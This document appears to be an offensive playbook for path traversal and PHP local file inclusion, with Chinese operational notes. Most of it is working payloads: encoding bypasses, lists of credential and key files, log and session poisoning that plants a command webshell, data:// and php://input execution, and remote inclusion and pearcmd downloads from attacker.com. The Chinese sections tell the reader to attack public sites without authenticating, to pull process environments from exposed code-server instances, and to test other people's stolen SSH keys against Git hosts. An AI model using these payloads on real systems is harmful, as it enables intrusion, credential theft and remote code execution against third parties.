> 短表「Nginx alias 缺斜杠」在 §22 下，用标题搜即可。站上已有 `/static` `/assets` `/img` 就可以打 `/static../`，不必先看见配置缺斜杠。没有这类前缀，走普通 `file=` 穿越，不要为了勾表空打。

# path-traversal-lfi

# Path Traversal / Local File Inclusion (LFI)


## 1. CORE CONCEPT

**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.
**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code, not just read.

```
http://target.com/index.php?page=home
→ Opens: /var/www/html/pages/home.php

Traversal attack:
http://target.com/index.php?page=../../../../etc/passwd
→ Opens: /etc/passwd
```

---

## 2. TRAVERSAL SEQUENCE VARIANTS

The filtering strategy determines which encoding to use:

### Basic
```
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)
```

### URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
```

### Double URL Encoding (when server decodes once, filter checks before decode)
```
%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
..%252f..%252fetc%252fpasswd
```

### Unicode / Overlong UTF-8
```
..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
..%ef%bc%8f          ← fullwidth solidus '／'
```

### Mixed Encodings
```
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd   ← double-dot with slash (filter strips single ../)
```

### Filter Strips `../` (so `../` becomes `../` after strip)
```
....//          ← becomes ../ after filter strips ../
..././          ← becomes ../ after filter strips ./
```

### Null Byte Injection (legacy PHP < 5.3.4)
```
../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
../../../../etc/passwd%00.php
```

---

## 3. TARGET FILES AND ESCALATION TARGETS

### Linux
```
/etc/passwd                  ← user list (usernames, UIDs)
/etc/shadow                  ← password hashes (requires root-level file read)
/etc/hosts                   ← internal hostnames → pivot targets
/etc/hostname                ← server hostname
/proc/self/environ           ← process environment (DB creds, API keys!)
/proc/self/cmdline           ← process command line
/proc/self/fd/0              ← stdin file descriptor
/proc/[pid]/maps             ← memory maps (loaded libraries with paths)
/var/log/apache2/access.log  ← for log poisoning
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log            ← SSH attempt log
/var/mail/www-data            ← email for www-data user
/home/USER/.ssh/id_rsa       ← SSH private key
/home/USER/.ssh/authorized_keys
/home/USER/.bash_history     ← command history (credentials!)
/home/USER/.aws/credentials  ← AWS keys
/tmp/sess_SESSIONID          ← PHP session files (if session.save_path=/tmp)
```

### Web Application Config Files
```
/var/www/html/.env           ← Laravel/Node.js env vars
/var/www/html/config.php     ← PHP config
/var/www/html/wp-config.php  ← WordPress DB credentials
/etc/apache2/sites-enabled/  ← Apache vhosts
/etc/nginx/sites-enabled/    ← Nginx config
/usr/local/etc/nginx/nginx.conf
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM          ← NTLM hashes (often locked)
C:\inetpub\wwwroot\web.config           ← ASP.NET DB connection strings
C:\inetpub\wwwroot\global.asa
C:\xampp\htdocs\wp-config.php
C:\Users\Administrator\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL config
```

---

## 4. PHP LFI → RCE TECHNIQUES

### Log Poisoning (most reliable when log is accessible)
**Step 1**: Inject PHP code into Apache/Nginx access log via User-Agent:
```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
**Step 2**: Include the log file via LFI:
```
?page=../../../../var/log/apache2/access.log&cmd=id
```

### SSH Log Poisoning
Inject PHP payload as SSH username:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```
Then include `/var/log/auth.log`.

### PHP Session File Poisoning
**Step 1**: Send PHP code in session-stored parameter (e.g., username), triggering storage in session file
**Step 2**: Include session file:
```
?page=../../../../tmp/sess_SESSIONID&cmd=id
```
Find session ID from cookie `PHPSESSID`.

### PHP Wrappers for RCE

**`php://expect` wrapper** (requires `expect` PHP extension):
```
?page=expect://id
```

**`php://input` wrapper** (combine LFI with POST body):
```
POST ?page=php://input
Body: <?php system('id'); ?>
```

**`data://` wrapper** (inject PHP directly as base64):
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```
(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)

---

## 5. PHP FILTER WRAPPER (FILE CONTENT READ)

Use `php://filter` to base64-encode file content to avoid null bytes, binary data:
```
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
```
Decode the returned base64 to see the file contents (including PHP source code).

**Chain filters** (multiple transforms to bypass input filters):
```
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
```

---

## 6. REMOTE FILE INCLUSION (RFI) — WHEN ENABLED

If PHP's `allow_url_include = On` (rare but exists):
```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```
Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`.

---

## 7. SERVER-SPECIFIC PATH TRUNCATION

PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:
```
?page=../../../../etc/passwd/./././././././././././............ (255+ chars)
```
When server appends `.php`, the truncation drops it.

Or null byte if PHP < 5.3.4:
```
?page=../../../../etc/passwd%00
```

---

## 8. PARAMETER LOCATIONS TO TEST

```
?file=        ?page=        ?include=    ?path=
?doc=         ?view=        ?load=       ?read=
?template=    ?lang=        ?url=        ?src=
?content=     ?site=        ?layout=     ?module=
```

Also test: HTTP headers, cookies, form `action` values, import/upload features.

---

## 9. FILTER BYPASS CHECKLIST

When `../` is stripped or blocked:

```
□ Try URL encoding: %2e%2e%2f
□ Try double URL encoding: %252e%252e%252f
□ Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f
□ Try mixed: ..%2F or ..%5C (backslash on Linux)
□ Try redundant sequences: ....// or ..././ (strip once → still ../)
□ Try null byte: /../../../etc/passwd%00
□ Try absolute path: /etc/passwd (if no path prefix added)
□ Try Windows UNC (Windows server): \\127.0.0.1\C$\Windows\win.ini
```

---

## 10. IMPACT ESCALATION PATH

```
Path traversal (read arbitrary files)
├── Read /etc/passwd → enumerate users
├── Read /proc/self/environ → find API keys, DB passwords in env
├── Read app config files → find credentials → horizontal movement
├── Read SSH private keys → direct server login
└── Find log paths → Log Poisoning → LFI RCE

LFI (PHP code inclusion)
├── Log poisoning → webshell
├── Session file poisoning → webshell  
├── php://input → direct code execution
├── data:// → direct code execution
└── php://filter → read PHP source code → find more vulnerabilities
```

---

## 11. LFI → RCE 补枪（主线 §4 没有的）

| 方法 | 条件 | 打法 |
|---|---|---|
| 邮件日志投毒 | LFI 能读 mail log | 主题塞 PHP → include `/var/log/mail.log` |
| `/proc/self/fd` | Linux + 有上传临时句柄 | 暴 `/proc/self/fd/0`～`255`，清理前 include |
| phpinfo 助攻 | 有 phpinfo 页 | multipart 上传让 phpinfo 吐 tmp 路径，竞态 include |
| iconv CVE-2024-2961 | glibc < 2.39 + `php://filter` | `cfreal/cnext-exploits`；不必可写路径 |

### php://filter 链

- `synacktiv/php_filter_chain_generator`：iconv 链写出 PHP，不必上传文件
- `synacktiv/php_filter_chains_oracle_exploit`：盲读逐字节
- `ambionics/wrapwrap`：给文件内容加前后缀，转 XXE / SSRF / 反序列化触发
- `phar://` 触发 phar 元数据反序列化；`zip://uploaded.zip%23shell.php`

### pearcmd（Docker PHP 常见）

`register_argc_argv=On` 且能 LFI 到 `pearcmd.php`：

```
/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php
/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+
/?file=pearcmd.php&+download+http://attacker.com/shell.php
/?file=pearcmd.php&+install+http://attacker.com/shell.tgz
```

### Windows FindFirstFile

`<` 单字符、`>` 序列：`php<<` 可撞 `php5` / `phtml`；`shel>` 在只差一字时撞 `shell.php`。

## 20. JAVA / SPRING PATH TRAVERSAL

### Spring Resource Loading

```java
// Vulnerable patterns — user input flows into resource path
ClassPathResource r = new ClassPathResource(userInput);
getClass().getResourceAsStream("/templates/" + userInput);
servletContext.getResourceAsStream("/WEB-INF/" + userInput);
```

```text
# Read WEB-INF deployment descriptor
GET /download?file=../WEB-INF/web.xml
GET /download?file=../WEB-INF/classes/application.properties
GET /download?file=../WEB-INF/classes/META-INF/persistence.xml

# Spring Boot specific
GET /download?file=../WEB-INF/classes/application.yml
GET /download?file=../WEB-INF/classes/bootstrap.properties
```

### High-value Java targets

```text
/WEB-INF/web.xml                        ← servlet mappings, filter chains, security constraints
/WEB-INF/classes/application.properties  ← DB creds, API keys, Spring config
/WEB-INF/classes/application.yml         ← same, YAML format
/WEB-INF/lib/                            ← application JARs (download for decompilation)
/META-INF/MANIFEST.MF                    ← build metadata, main class
/META-INF/context.xml                    ← Tomcat datasource definitions
```

### Spring MVC `ResourceHttpRequestHandler`

When static resources are served via `spring.resources.static-locations`:
```text
GET /static/..%252f..%252fWEB-INF/web.xml
GET /static/..;/..;/WEB-INF/web.xml       ← Tomcat path parameter normalization
```

---

## 21. TOMCAT-SPECIFIC TRICKS

### Path Parameter Normalization (`/..;/`)

Tomcat treats `;` as a path parameter delimiter and strips everything from `;` to the next `/` **before** path resolution, but upstream proxies or WAFs may not:

```text
GET /app/..;/manager/html           ← Tomcat resolves to /manager/html
GET /app/..;jsessionid=x/..;/WEB-INF/web.xml
```

**WAF bypass chain**: reverse proxy sees `/app/..;/manager/html` as a path under `/app/` (allowed), but Tomcat normalizes `..;` to `..` and traverses up.

### AJP Ghostcat (CVE-2020-1938)

Apache JServ Protocol (AJP, port 8009) exposed to the network allows arbitrary file read and JSP execution:

```text
# Read any file through AJP
python3 ajpShooter.py http://target:8009 /WEB-INF/web.xml read

# Include attacker-controlled file as JSP for execution
python3 ajpShooter.py http://target:8009 / eval --ajp-secret="" \
  -H "javax.servlet.include.request_uri:/anything" \
  -H "javax.servlet.include.servlet_path:/uploads/avatar.txt"
```

**Conditions**: AJP connector on port 8009 reachable (default Tomcat, often not firewalled in Docker/internal). `secretRequired` unset prior to Tomcat 9.0.31.

### Tomcat double-URL-decode

```text
GET /%252e%252e/%252e%252e/etc/passwd
```

---

## 22. NGINX ALIAS MISCONFIGURATION

### Nginx alias 缺斜杠（短表有指针）

认：站上已有 `/static`、`/assets`、`/img`、`/files` 这类前缀（黑盒看不见 nginx 配置，有前缀就打）；或 Caddy 模板吃用户输入。

打：

1. `GET /static../etc/passwd`、`GET /static../etc/nginx/nginx.conf`、`GET /assets..%2f..%2fetc%2fpasswd`。
2. 对照：`/static/../etc/passwd` 常被规范化挡掉，**缺斜杠那一枪**才是 alias 替换前缀。
3. Caddy 模板面：输入里试 `{{readFile "/etc/passwd"}}`、`{{.Req.Host}}`。读到文件才算，只反射 Host 不算本条。

算成：读到 web 根以外的配置 / 密钥 / `nginx.conf`。只能列静态目录里本来就有的 css/图 → 没成。

假点：404；alias 两边都有斜杠，规范化后出不去；Caddy 模板不执行用户输入。单站没中不删短表这行。有静态前缀就打，不必先看见 nginx 配置。普通 `file=` 穿越仍走上面通用段，两枪不互相替代。

### The trailing-slash trap

```nginx
# VULNERABLE — missing trailing slash on location
location /assets {
    alias /data/;
}
```

Nginx maps `/assets../etc/passwd` to `/data/../etc/passwd` to `/etc/passwd` because `alias` replaces the exact location prefix (`/assets`) with the alias path (`/data/`), and `../` in the remainder traverses out.

```text
GET /assets../etc/passwd HTTP/1.1
GET /assets..%2f..%2fetc%2fpasswd HTTP/1.1
```

**Correct configuration**:
```nginx
location /assets/ {
    alias /data/;
}
```

### Off-by-one in `location` + `alias`

```nginx
location /img {
    alias /var/images;
}
# /img../secret -> /var/images/../secret -> /var/secret
```

Rule: when `alias` is used, the `location` prefix and the alias path must both end with `/`, or neither does.

---

## 23. NODE.JS PATH MODULE QUIRKS

### `path.join()` with URL-encoded input

```javascript
const path = require('path');

app.get('/files/:name', (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.name);
    res.sendFile(filePath);
});
```

Express URL-decodes `req.params` before `path.join`:

```text
GET /files/..%2f..%2f..%2fetc%2fpasswd
req.params.name = "../../../etc/passwd" (already decoded)
path.join(__dirname, 'uploads', '../../../etc/passwd') = /etc/passwd
```

### `express.static()` quirks

- Calls `decodeURIComponent` on the path, then `path.normalize()`
- Double encoding (`%252e%252e%252f`) bypasses if middleware decodes once, then `express.static` decodes again
- Null bytes (`%00`) rejected in modern Node.js (v14+), but legacy versions may truncate

### `url.parse()` vs `new URL()` confusion

```javascript
// Legacy: url.parse() does NOT resolve path traversal
const parsed = require('url').parse(userInput);
// parsed.pathname may contain ../

// Modern: new URL() normalizes the path
const parsed = new URL(userInput, 'http://localhost');
// parsed.pathname has ../ resolved
```

Apps mixing `url.parse()` and `path.join()` may allow traversal that `new URL()` would have normalized.

### 仓库根当静态（koa-static / express.static 指到 cwd）

认：页面或 `/package.json` 能直接 GET 到 Node 工程文件（`package.json`、`routes/`、`index.js`），说明静态中间件指的是仓库根，不是 `public/`。

打：不登录。顺着 node-config 环境名打 `/config/online.yml` `/config/default.yml` `/config/production.yml` `/config/pre.yml` `/config/dev.yml`，以及 `.env`。不必先打 `../`。

算成：yml/json 里是**完整库账密或云密钥实值**。只有 README / 无钥源码 / 只有端口的空模板 → 没成（信息级不报）。

假点：静态根只出 `public`；`package.json` 200 但 config 404；yml 没有账密。单站没中不删这套认法。

### 静态桶上的 .NET 发布物（aspx 还能 GET）

认：对象存储 / 静态桶（MSS `product-fe-*` 一类）上挂着旧 .NET 发布物。aspx 源码还能 GET，不是编译后才吐。同目录 `web.config` 常被 WAF 拦。不是 Node 仓库根（那枪见上一节）。

打：不登录。`web.config` 456 别停，打同目录 `App.config`、`Web.Release.config`、`*.exe.config`、`bin/*.dll.config`。有 bin 再扫 `*.pdb` 看有没有连配置。

算成：完整账密或 DeveloperToken，不是 `ENTER_YOUR_*` 占位。

假点：aspx 200 但 config 404；只有源码没有钥；占位符口令。密钥实值不进库。单站没中不删这套认法。

### 公网 VS Code 系读进程环境

认：公网 code-server；打开 `/login` 直接进编辑器（无登录墙）。

打：不登录 `GET /remote-resource?path=/proc/self/status` 看 Uid，再 `path=/proc/self/environ`。公网 VS Code 系、页面/`_static` 里 `AuthType.None` 是常见皮，没有这个字仍打。不要停在 README。environ 里若有 SSH 私钥（常是 Base64 PEM）：**解开后假钥对照** 连环境里的 Git 主机，真钥 Hello 用户名、假钥 Permission denied。只抄到字符串不算认钥。

算成：environ 里是**他人**邮箱和完整 SSH 私钥，且真钥能问出 Git 用户名。只有安装脚本 / 公开模板 → 没成。

假点：path 要登录；只读到 README；真假钥同一句 Permission denied。认证枚举名不是 None 不算假点。单站没中不删短表这行。密钥实值不进库。

### 前端构建 / 静态服务组件（按指纹分派）

认：`package.json` 的构建依赖与 scripts、根 HTML 直接引 `/src/` 模块、开发服务错误页、source map、server banner、asset 命名、现场槽位 `FRONTEND_BUILD_SERVICE_FINGERPRINT`。识别值只说明组件形态，不能替代现场请求确认。

打：不登录。先按组件指纹分派：
- Vite / Vite Dev Server：`/@fs/`、`?raw`、`?import&raw`，并把 `../`、绝对路径、盘符、斜杠方向做归一化组合。
- Webpack Dev Server / webpack-dev-middleware：`/webpack-dev-server`、source map、历史版本对应的目录穿越面；按现场版本核对，不把 CVE 名直接当成立。
- 未识别组件：保留常规静态越根、`.env*` / 配置文件读取、source map 检查；无差分面就回业务面，不为凑类型硬打。

算成：读到 Web 根外无害系统文件或敏感配置；回包被包成 JS 模块 / source map 形态时，仍以正文文件特征判成。

假点：只读到 Web 根内公开静态文件；只见到 README / 构建说明；只拿到 package.json 元数据但没有外部读取。单站没中不删短表这行。

---

## 24. IIS SHORT FILENAME ENUMERATION (~1 TILDE TRICK)

### Concept

Windows NTFS generates 8.3 short filenames (e.g., `LONGFI~1.TXT`). IIS responds differently for valid vs invalid short name prefixes.

### Detection method

```text
GET /W~1.ASP HTTP/1.1  -> 404 (name pattern valid)
GET /Z~1.ASP HTTP/1.1  -> 400 (bad request)
```

Differential response leaks whether a file starting with that prefix exists.

### Enumeration process

```text
Step 1: /A~1* -> 404 = file starting with A exists
Step 2: /AB~1* -> 404 = file starting with AB exists
Step 3: /ABCDEF~1.A* -> 404 = extension starts with A
```

### Tools

```bash
java -jar iis_shortname_scanner.jar https://target.com/
```

### Impact

- Discover hidden backups, config files, source code
- Shorter brute-force space: 8.3 format limits character set
- Works even when directory listing is disabled
